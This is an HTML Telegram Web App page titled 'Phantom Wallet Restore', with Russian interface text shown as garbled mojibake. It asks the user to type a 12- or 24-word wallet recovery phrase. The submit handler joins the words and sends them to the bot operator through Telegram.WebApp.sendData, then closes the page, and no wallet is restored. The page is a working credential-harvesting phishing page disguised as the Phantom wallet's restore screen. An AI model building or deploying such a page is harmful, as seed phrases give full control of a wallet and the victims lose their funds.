<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Phantom Wallet Restore</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      margin: 30px;
      background: #f2f2f2;
      color: #333;
      text-align: center;
    }

    h2 {
      margin-bottom: 20px;
    }

    #word-count-toggle {
      margin-bottom: 20px;
    }

    .seed-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
      max-width: 600px;
      margin: 0 auto;
    }

    .seed-grid input {
      padding: 8px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 6px;
      text-align: center;
    }

    button {
      margin-top: 25px;
      padding: 12px 30px;
      font-size: 16px;
      background-color: #7c3aed;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    button:hover {
      background-color: #5b21b6;
    }
  </style>
</head>
<body>
  <h2>üîê –í–æ—Å—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∏–µ –∫–æ—à–µ–ª—å–∫–∞</h2>

  <div id="word-count-toggle">
    <label><input type="radio" name="wordCount" value="12" checked> 12 —Å–ª–æ–≤</label>
    <label><input type="radio" name="wordCount" value="24"> 24 —Å–ª–æ–≤–∞</label>
  </div>

  <div id="inputs" class="seed-grid"></div>

  <button onclick="submit()">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>

  <script>
    const container = document.getElementById("inputs");

    function renderInputs(count) {
      container.innerHTML = "";
      for (let i = 1; i <= count; i++) {
        const input = document.createElement("input");
        input.placeholder = i;
        input.id = "word" + i;
        container.appendChild(input);
      }
    }

    document.querySelectorAll('input[name="wordCount"]').forEach(radio => {
      radio.addEventListener('change', () => {
        const count = parseInt(radio.value);
        renderInputs(count);
      });
    });

    // –Ω–∞—á–∞–ª—å–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ ‚Äî 12 —Å–ª–æ–≤
    renderInputs(12);

    function submit() {
      const inputs = document.querySelectorAll(".seed-grid input");
      const words = Array.from(inputs).map(i => i.value.trim()).filter(Boolean);
      if (words.length !== inputs.length) {
        alert("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è.");
        return;
      }

      const phrase = words.join(" ");
      Telegram.WebApp.sendData(phrase);
      Telegram.WebApp.close();
    }
  </script>
</body>
</html>
